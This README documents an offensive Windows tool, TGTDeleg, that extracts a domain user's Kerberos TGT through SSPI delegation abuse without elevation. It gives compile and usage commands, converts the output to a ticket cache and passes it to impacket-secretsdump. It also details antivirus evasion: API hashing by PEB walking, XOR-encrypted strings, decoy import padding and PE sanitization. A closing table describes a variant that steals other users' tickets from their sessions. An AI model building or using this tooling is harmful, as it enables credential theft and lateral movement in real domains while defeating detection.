# TGTDeleg

A standalone Kerberos TGT extraction tool using the tgtdeleg technique. Runs as a regular domain user without elevation.

## How It Works

The tool abuses SSPI to request a delegation TGT, then extracts the session key from the Kerberos ticket cache. The output can be processed by an external script to reconstruct a usable `.kirbi` or `.ccache` ticket.

## Compilation

```bash
x86_64-w64-mingw32-g++ -O2 -s -static tgtdeleg.cpp -o tgtdeleg.exe
```

## Usage

```bash
# Auto-detect target SPN (HOST/<local FQDN>)
tgtdeleg.exe

# Specify target SPN manually
tgtdeleg.exe -t HOST/dc.domain.local
```

## Output

```
[*] Target SPN: HOST/workstation.domain.local
[AP-REQ]
6082...

[Session Key]
A1B2C3...
```

## Post-Processing

Use the `extract_tgt.py` script to convert the output into a usable ticket:

```bash
python3 extract_tgt.py -req <AP_REQ_HEX> -key <SESSION_KEY_HEX> -out ticket.ccache
export KRB5CCNAME=ticket.ccache

# Now use with Impacket or other Kerberos tools
impacket-secretsdump domain/user@target -k -no-pass
```

## Detection Evasion

- Dynamic API resolution via PEB walking (no static imports of sensitive functions)
- Compile-time string encryption (XOR)
- No suspicious process creation or token manipulation

## Technical Notes

### Technique: SSPI TGT Delegation Abuse

The tool exploits Windows SSPI (Security Support Provider Interface) to extract a usable Kerberos TGT from the current user's session without elevation.

**Why it works:** When `InitializeSecurityContextW` is called with the `ISC_REQ_DELEGATE` flag, Windows embeds a forwarded TGT inside the AP-REQ token. This is the normal mechanism for Kerberos delegation (e.g. a web server forwarding a user's credentials to a backend database). By requesting delegation against any valid SPN, the tool obtains an AP-REQ blob containing the user's TGT. The session key is then extracted separately via the LSA interface, allowing offline decryption of the AP-REQ to recover the full ticket.

**No elevation required** — all APIs used (`AcquireCredentialsHandleW`, `InitializeSecurityContextW`, `LsaConnectUntrusted`, `LsaCallAuthenticationPackage`) work with a regular domain user's privileges.

### Execution Timeline

```
TgtDelegEntry()
│
├─ 1. InitAPIs()
│     ├─ PEB walk (GS:[0x60]) → find kernel32.dll by module hash
│     ├─ PEB walk → find sspicli.dll by module hash
│     ├─ Stealth::LoadLibraryH("netapi32.dll") → load if not present
│     └─ Resolve 20+ function pointers by DJB2 hash from export tables:
│          kernel32: CloseHandle, GetLastError, MultiByteToWideChar,
│                    GetComputerNameExW, GetEnvironmentVariableA
│          netapi32: DsGetDcNameA, NetApiBufferFree
│          sspicli:  AcquireCredentialsHandleW, InitializeSecurityContextW,
│                    FreeContextBuffer, LsaConnectUntrusted,
│                    LsaLookupAuthenticationPackage,
│                    LsaCallAuthenticationPackage, LsaFreeReturnBuffer,
│                    LsaDeregisterLogonProcess
│          kernel32: GetStdHandle, WriteFile, ExitProcess, GetCommandLineA
│
├─ 2. Parse command line
│     ├─ GetCommandLineA() → manual argument parsing
│     └─ If -t <SPN> provided → use as target
│        Else → call GetTargetSPN()
│
├─ 3. GetTargetSPN() (auto-detection)
│     ├─ GetEnvironmentVariableA("LOGONSERVER") → e.g. "\\DC01"
│     ├─ GetEnvironmentVariableA("USERDNSDOMAIN") → e.g. "CORP.LOCAL"
│     └─ Construct: "HOST/dc01.corp.local"
│
├─ 4. RunTgtDeleg(targetSPN)
│     │
│     ├─ AcquireCredentialsHandleW(
│     │       NULL,                    // current user
│     │       L"Kerberos",             // package
│     │       SECPKG_CRED_OUTBOUND,    // outbound credentials
│     │       ...)
│     │   → hCred: handle to user's Kerberos credentials
│     │
│     ├─ InitializeSecurityContextW(
│     │       &hCred,
│     │       NULL,                    // no existing context (first call)
│     │       targetSPN,               // e.g. L"HOST/dc01.corp.local"
│     │       ISC_REQ_DELEGATE |       // ← KEY: request TGT delegation
│     │       ISC_REQ_MUTUAL_AUTH |
│     │       ISC_REQ_ALLOCATE_MEMORY,
│     │       ...)
│     │   → SecBuffer sbOut: contains AP-REQ blob with embedded forwarded TGT
│     │
│     ├─ Print AP-REQ as hex string
│     │
│     ├─ LsaConnectUntrusted(&hLsa)
│     │   → Non-elevated LSA connection
│     │
│     ├─ LsaLookupAuthenticationPackage(hLsa, "Kerberos", &authPkgId)
│     │   → Get Kerberos package identifier
│     │
│     ├─ Build KERB_RETRIEVE_TKT_REQUEST:
│     │       MessageType  = KerbRetrieveEncodedTicketMessage
│     │       TargetName   = targetSPN
│     │       CacheOptions = 0
│     │
│     ├─ LsaCallAuthenticationPackage(hLsa, authPkgId, &request, ...)
│     │   → KERB_RETRIEVE_TKT_RESPONSE with:
│     │       Ticket.SessionKey.Value  → the session key bytes
│     │       Ticket.SessionKey.Length → key length
│     │
│     └─ Print session key as hex string
│
└─ ExitProcess(0)
```

### Windows APIs Used

| API | Source DLL | Resolved via | Purpose |
|-----|-----------|-------------|---------|
| `AcquireCredentialsHandleW` | sspicli | Hash `0x...` | Get current user's Kerberos credential handle |
| `InitializeSecurityContextW` | sspicli | Hash `0x...` | Build AP-REQ with `ISC_REQ_DELEGATE` flag |
| `FreeContextBuffer` | sspicli | Hash `0x...` | Free SSPI-allocated buffers |
| `LsaConnectUntrusted` | sspicli | Hash `0x...` | Non-elevated LSA connection |
| `LsaLookupAuthenticationPackage` | sspicli | Hash `0x...` | Get Kerberos package ID |
| `LsaCallAuthenticationPackage` | sspicli | Hash `0x...` | Retrieve encoded ticket + session key |
| `LsaFreeReturnBuffer` | sspicli | Hash `0x...` | Free LSA response memory |
| `LsaDeregisterLogonProcess` | sspicli | Hash `0x...` | Clean up LSA handle |
| `DsGetDcNameA` | netapi32 | Hash `0x...` | DC discovery (if needed) |
| `NetApiBufferFree` | netapi32 | Hash `0x...` | Free NetAPI buffers |
| `GetComputerNameExW` | kernel32 | Hash `0x...` | Get local FQDN |
| `GetEnvironmentVariableA` | kernel32 | Hash `0x...` | Read LOGONSERVER, USERDNSDOMAIN |
| `CloseHandle` | kernel32 | Hash `0x...` | Close handles |
| `GetStdHandle` | kernel32 | Hash `0x...` | Get stdout/stderr handles |
| `WriteFile` | kernel32 | Hash `0x...` | Output to console (no-CRT printf replacement) |
| `ExitProcess` | kernel32 | Hash `0x...` | Terminate process |
| `GetCommandLineA` | kernel32 | Hash `0x...` | Get raw command line |
| `MultiByteToWideChar` | kernel32 | Hash `0x...` | Convert SPN string to wide chars |

### Evasion Layer

**No-CRT compilation:** Compiled with `-nostartfiles`, custom entry point `TgtDelegEntry()`. Manual `memcpy`/`memset` implementations. No dependency on `msvcrt.dll`. Console output via direct `WriteFile` to `GetStdHandle(STD_OUTPUT_HANDLE)`.

**API hashing (DJB2 + PEB walking):** All sensitive APIs are resolved at runtime. The PEB is accessed via `__readgsqword(0x60)` (x64), then `InMemoryOrderModuleList` is walked to find loaded DLLs by DJB2 hash. Each DLL's PE export table is parsed manually to find functions by hash. Export forwarders are followed transparently. No `GetModuleHandle`/`GetProcAddress` in the import table.

**Compile-time XOR string encryption:** All string literals (`"kernel32.dll"`, `"sspicli.dll"`, `"Kerberos"`, `"LOGONSERVER"`, `"USERDNSDOMAIN"`, `"-t"`, etc.) are encrypted at compile time using a `constexpr` C++ template `XorStr<N>` with a random 16-byte key generated per build. Decrypted on the stack at runtime.

**IAT padding:** The `_iat_pad()` function references benign APIs (`GetTempPathW`, `CreateFileW`, `ReadFile`, `WriteFile`, `FindFirstFileW`, `RegOpenKeyExW`, `GetStdHandle`, `SetConsoleTitleW`, etc.) behind a `volatile int z = 0` guard. These are never executed but populate the import table with innocuous entries.

**PE sanitization:** Post-build `sanitize_pe.py` zeros out DOS stub, linker version bytes, and debug directory entries.

### Relationship to ComBridge

This binary is the **standalone local version** of the same SSPI delegation technique used in `combridge_tgtdeleg`. The core SSPI + LSA flow is identical:

| Aspect | tgtdeleg (standalone) | combridge_tgtdeleg |
|--------|----------------------|-------------------|
| **Runs where** | Locally, as the current user | In target session via COM Session Moniker |
| **Elevation** | None required | Admin (for HKCR registry writes) |
| **Use case** | Extract own TGT | Extract another user's TGT from their session |
| **SSPI context** | Current user's credentials | Target user's credentials (COM server runs in their session) |
| **Output** | AP-REQ + session key (hex) | Same, returned via IDispatch BSTR |
